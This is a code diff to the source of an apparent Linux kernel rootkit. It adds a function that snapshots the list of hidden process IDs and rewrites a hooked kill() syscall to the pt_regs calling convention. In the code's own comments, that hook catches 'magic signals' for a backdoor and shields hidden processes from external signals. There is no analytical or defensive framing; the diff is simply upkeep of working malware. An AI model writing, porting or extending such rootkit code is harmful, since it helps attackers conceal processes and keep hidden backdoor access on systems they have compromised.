@@ -49,6 +49,17 @@ int is_pid_hidden(int pid) {
     return hidden;
 }
 
+int proc_hide_snapshot(int *dst, int max) {
+    unsigned long flags;
+    int n;
+    spin_lock_irqsave(&proc_hide_lock, flags);
+    n = hidden_pid_count < max ? hidden_pid_count : max;
+    if (n > 0)
+        memcpy(dst, hidden_pids, n * sizeof(int));
+    spin_unlock_irqrestore(&proc_hide_lock, flags);
+    return n;
+}
+
 /*
  * This is called from file_hide.c's getdents64 hook.
  * When enumerating /proc, PID directory names are numeric.
@@ -74,15 +85,18 @@ int is_proc_pid_hidden(const char *d_name) {
  * Hooked kill() — intercept magic signals for backdoor + protect
  * hidden processes from external signals
  * ================================================================ */
-asmlinkage long hooked_kill(pid_t pid, int sig) {
-    long (*orig_kill)(pid_t, int);
+asmlinkage long hooked_kill(const struct pt_regs *regs) {
+    pid_t pid = (pid_t)regs->di;
+    int sig = (int)regs->si;
+    long (*orig_kill)(const struct pt_regs *);
+
     orig_kill = (void *)hooks[HOOKIDX_KILL].original;
 
     /* Check for magic packet backdoor trigger (see backdoor.c) */
     if (backdoor_check_magic(pid, sig))
         return 0;
 
-    return orig_kill(pid, sig);
+    return orig_kill(regs);
 }
 
 int proc_hide_init(void) {
